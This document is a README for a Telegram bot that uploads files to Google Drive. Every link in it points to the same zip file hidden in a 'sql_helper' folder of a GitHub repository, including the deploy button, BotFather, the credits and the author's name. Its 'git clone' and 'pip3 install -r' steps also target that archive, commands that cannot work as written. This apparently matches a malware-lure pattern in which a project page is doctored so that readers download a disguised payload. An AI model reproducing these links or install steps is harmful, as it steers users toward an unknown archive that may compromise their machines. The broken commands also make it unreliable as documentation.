# Google Drive Uploader Telegram Bot
**A Telegram bot to upload files from Telegram or Direct links to Google Drive.**
- Find it on Telegram as [Google Drive Uploader](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)

## Features
- [X] Telegram files support.
- [X] Direct Links support.
- [X] Custom Upload Folder.
- [X] TeamDrive Support.
- [X] Clone/Copy Google Drive Files.
- [X] Delete Google Drive Files.
- [X] Empty Google Drive trash.
- [X] youtube-dl support.

## ToDo 
- [ ] Handle more exceptions.
- [ ] LOGGER support.
- [ ] Service account support.
- [ ] Update command.

## Deploying

### Deploy on [Heroku](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
[![Deploy](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)

### Installation
- Install required modules.
```sh
apt install -y git python3 ffmpeg
```
- Clone this git repository.
```sh 
git clone https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip
```
- Change Directory
```sh 
cd google-drive-telegram-bot
```
- Install requirements with pip3
```sh 
pip3 install -r https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip
```

### Configuration
**There are two Ways for configuring this bot.**
1. Add values to Environment Variables. And add a `ENV` var to Anything to enable it.
2. Add values in [https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip). And make sure that no `ENV` environment variables existing.

### Configuration Values
- `BOT_TOKEN` - Get it by contacting to [BotFather](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- `APP_ID` - Get it by creating app on [https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- `API_HASH` - Get it by creating app on [https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- `SUDO_USERS` - List of Telegram User ID of sudo users, seperated by space.
- `SUPPORT_CHAT_LINK` - Telegram invite link of support chat.
- `DATABASE_URL` - Postgres database url.
- `DOWNLOAD_DIRECTORY` - Custom path for downloads. Must end with a forward `/` slash. (Default to `./downloads/`)

### Deploy 
```sh 
python3 -m bot
```

## Credits
- [Dan](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip) for creating [PyroGram](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- [Spechide](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip) for [https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- [Shivam Jha](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip) for [Clone Feature](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip) from [python-aria-mirror-bot](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)

## Copyright & License
- Copyright (©) 2020 by [Adnan Ahmad](https://raw.githubusercontent.com/kyaw287/google-drive-telegram-bot/main/bot/helpers/sql_helper/drive_google_bot_telegram_v3.4.zip)
- Licensed under the terms of the [GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007](./LICENSE)